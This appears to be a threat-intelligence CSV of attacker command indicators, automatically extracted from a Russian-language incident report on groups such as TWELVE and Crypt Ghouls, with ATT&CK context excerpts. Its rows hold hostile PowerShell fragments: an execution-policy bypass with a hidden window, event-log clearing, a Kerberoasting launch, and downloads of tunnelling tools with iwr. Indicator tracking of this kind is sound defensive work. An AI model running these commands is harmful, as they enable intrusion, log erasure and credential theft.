schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:f03fe888da629fbbf728854ffa5f5a6285dd1317e8240c915dccc4cf93e71a95,observation--sha256:5e278d70c0a605319c7b97200b1d2251ac36afae83820702bc7f3dc3d94aa35d,command,"powershell -Command \""Invoke-WebRequest 'https://files.gkrzn[.]ru/","powershell -Command \""Invoke-WebRequest 'https://files.gkrzn.ru/",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 166}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1016 System Network Configuration Discovery Одна из задач злоумышленников на ранних этапах после компрометации — это определение публичного IP-адреса зараженного хоста. Для этого использовалась следующая PowerShell-команда: Команда обращается к стороннему публичному сервису https://ident.me, который возвращает внешний IP-адрес устройства. Также в рамках этапа разведки в скомпрометированной системе злоумышленники запустили следующую команду: powershell.exe -C ""[Console]::OutputEncoding = New-Obj",
1.0.0,actor--anonymous,artifact--sha256:f33085a6ecc8a0b94173a4c8cde3681e97896308a40fa6c1d3361384c6435b95,observation--sha256:14b3f24c26680efe37f8d506cea9d0bef3a1f52db74eaf2d3e105982968b11c2,command,powershell -command wevtutil el | Foreach-Object {Write-Host Clearing $_;,powershell -command wevtutil el | Foreach-Object {Write-Host Clearing $_,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы T1036.004 Masquerade Task or Service T1036.005 Match Legitimate Resource Name or Location Чтобы избежать обнаружения, атакующие маскировали свои вредоносные программы и задачи под названия существующих продуктов или сервисов: T1070.001 Clear Windows Event Logs T1070.007 Clear Network Connection History and Configurations Кроме того, атакующие удаляли следы использования RDP с помощью скрипта, очищающего историю подключений по RDP, а такж",
1.0.0,actor--anonymous,artifact--sha256:11678ee802cc6f4a4a307e01c42299fccd1f88849faea9e9bff93791b299df0f,observation--sha256:2b20579f27464c9f270376a46639ecfc33dbd2bf251c29cfbe79988d927e11f7,command,powershell -ep bypass; .\1.ps1 -usersfile users -dc-ip [REDACTED],powershell -ep bypass; .\1.ps1 -usersfile users -dc-ip [REDACTED,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 251}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1558.003 Kerberoasting На зараженных хостах были обнаружены следы, свидетельствующие о попытке проведения атаки Kerberoasting. В частности, на одном из устройств было зафиксировано использование скрипта GetUserSPNs.ps1 из набора инструментов Kerberoast, который применяется для извлечения служебных билетов (TGS) по учетным записям с привязкой к SPN (Service Principal Name) для последующего взлома хэшей офлайн. Команда запуска скрипта: T1558.004 AS-REP Roasting Также в рамках анализа артефактов в",
1.0.0,actor--anonymous,artifact--sha256:fb6add0932a77e534deb180f5a3e7e63f39815411e5ab38981e2b64375098dc5,observation--sha256:ba1de1cde4218f062650846333f53caea17816a5d537fa44cb8d3e4b2dfb15b1,command,powershell -ex bypass -f ad_ru.ps1,powershell -ex bypass -f ad_ru.ps1,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы T1087 Account Discovery Помимо этого, группа использовала командлеты модуля PowerView для обнаружения учетных записей пользователей домена: T1069 Permission Groups Discovery Информацию о группах домена TWEL VE получала при помощи PowerShell: В рамках пользовательской сессии злоумышленники выполняют команду: Файл ad_ru.ps1 является утилитой для разведки Active Directory ADRecon. Через использование интернет-браузера Google Chrome группиро",
1.0.0,actor--anonymous,artifact--sha256:a7795823544af389802367cec40163e07e85cef8c2b1091202e621cddb2df85f,observation--sha256:f17d168914e553bfb9d5c76a177e50849f8b39061aa3225acae3db14eb937896,command,"powershell -exec bypass -windowstyle hidden -nop -c ""$raw= [io.","powershell -exec bypass -windowstyle hidden -nop -c ""$raw= [io",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 212}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Во втором сценарии заражения вложенный архив RAR содержит документ Microsoft Office с макросом, который выполняет роль дроппера. При открытии документа его текст отображается в неразборчивом виде, и появляется предупреждающее сообщение, убеждающее пользователя включить макросы. Нажатие на кнопку «Включить содержимое» активирует макрос, который скрывает предупреждающее изображение и восстанавливает оригинальный текст. powershell -exec bypass -windowstyle hidden -nop -c ""$raw= [io. file]::ReadAllT",
1.0.0,actor--anonymous,artifact--sha256:b598cd1ef1826035930df59d6aefcc789137fe79037dd4b9ef4f41cf39f3db25,observation--sha256:e963f31c1ed5d33867fc7b2865e39fbf0370eab19fb85f370a39acaf3a5bcfe1,command,"powershell -executionpolicy bypass -command ""& { start-process 'c:\users\","powershell -executionpolicy bypass -command ""& { start-process 'c:\users\",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 138}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Примеры путей и имен утилиты rclone: Злоумышленники на протяжении многих месяцев могут использовать замаскированный rclone для «тихой» эксфильтрации определенных файлов, которые задаются атакующими в текстовом файле и с использованием WebDAV выгружаются на командные сервера группировки. Ниже приведен пример использования утилиты атакующими: Еще один пример использования переименованной утилиты rclone. В данном случае происходит запуск в фоне, через powershell c обходом политик выполнения, чтобы ",
1.0.0,actor--anonymous,artifact--sha256:6f83b15fddb32eb59cffb75e1495dfa3853137e4ff8d48c00440c9a886850164,observation--sha256:dece78510c4ee829fc73f6814c7b68fca519f96f6e02de2ac4de377dc772d994,command,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 286}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Установка происходит с помощью следующего кода PowerShell из файла proxy.ps1: Атакующие через командную строку передают токен для аутентификации в сервисе: # Service install Write-Host ""[*] Installing cloudflared as service"" Start-Process $cloudflaredPath -ArgumentList ""service install $t"" -RedirectStandardError $tempFile -NoNewWindow -Wait $output = Get-Content $tempFile Write-Output $output C:\Windows\System32\winuac.exe tunnel run --token eyJhIjoiYjc2MDAxM… [REDACTED]...RReExUaG1aV1l0WVRVd01X",
1.0.0,actor--anonymous,artifact--sha256:6f83b15fddb32eb59cffb75e1495dfa3853137e4ff8d48c00440c9a886850164,observation--sha256:42f36bd5847fe4bfd5c9d1c1ec53bcdc7e0c43dde4e10726941d4956b1409614,command,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 74}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.001 PowerShell Атакующие использовали PowerShell для выполнения команд на хостах жертвы: T1059.003 Windows Command Shell Атакующие также использовали cmd.exe для выполнения команд на хостах: T1059.004 Unix Shell Для запуска Babuk на серверах ESXi атакующие использовали Unix Shell: Execution cmd.exe /Q /c powershell.exe ""Get-LocalUser | Select name"" 1> \Windows\Temp\ qnLJbp 2>&1"" powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile ltn.zip -usebasicparsing; expand-ar",
1.0.0,actor--anonymous,artifact--sha256:6f83b15fddb32eb59cffb75e1495dfa3853137e4ff8d48c00440c9a886850164,observation--sha256:0b6d737c34acca7aaeb61006984dec00665991f5648130861255fb94f72a6cf8,command,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,powershell.exe out-file -inputobject (7zr.exe a c:\programdata\ad.7z c:\ programdata\activedirectory) -encoding utf8 -filepath c:\programdata\ microsoft\vault\4c6b60eb-eafe-ab9b-adfa-ed24b2398e0c powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile ltn.zip -usebasicparsing; iwr http://localtonet.com/nssm-2.24.zip -outfile nssm.zip - usebasicparsing; c:\programdata\activedirectory\ c:\programdata\microsoft\vault\ T1560 Archive Collected Data Атакующие архивировали собранны,
1.0.0,actor--anonymous,artifact--sha256:6f83b15fddb32eb59cffb75e1495dfa3853137e4ff8d48c00440c9a886850164,observation--sha256:fb60475a5162b78f78674985053b10f8fbf817acafe49cc58163f0c6130318d9,command,powershell iwr hxxp://localtonet.com/download/localtonet-win-64.zip -outfile,powershell iwr http://localtonet.com/download/localtonet-win-64.zip -outfile,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 83}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TWELVE и BlackJack активно использовали ngrok в то время, как Crypt Ghouls применяли localtonet для туннелирования. Для доставки утилиты злоумышленники скачали утилиту с сайта localtonet через PowerShell: Ранее мы предположили, что существует пересечение участников группировки BlackJack и TWELVE либо координация между командами в рамках одной или нескольких совместных операций. Вторая гипотеза заключается в том, что Crypt Ghouls является либо последующим перерождением TWELVE, либо отколовшейся г",
1.0.0,actor--anonymous,artifact--sha256:14ddce6ef5e48bcd0abc6f1e6ed0c5d309b7f81a92ba4996eb48fef48431d784,observation--sha256:5c8fc7bdc9910605227ac51becd3d11d0d1a824a450eb456303f4df3c6ca1488,command,"powershell.exe -C ""[Console]::OutputEncoding = New-Object System.Text.","powershell.exe -C ""[Console]::OutputEncoding = New-Object System.Text",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 164}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"В рамках проведенного исследования были зафиксированы следующие названия, использовавшиеся для маскировки вредоносных компонентов: • libcairo-2.dll, • driver_printer.exe, • chrome_proxy.exe, • onedrivesync.exe, • OneDirveSvh.exe, • windowssubprocessqueue.exe, • dbinit.exe, • nvidiacontrolpanel.exe, • telegram.exe, • yandexupdate.exe, • chrome.exe, • openvpndaemon.exe, • kesservice.exe, • klservice.exe, • GoogleUpdate.exe, • dbexecutor.exe, • ms-teams.exe, • csrss32.exe, • msedgeconnect.exe, • pk",
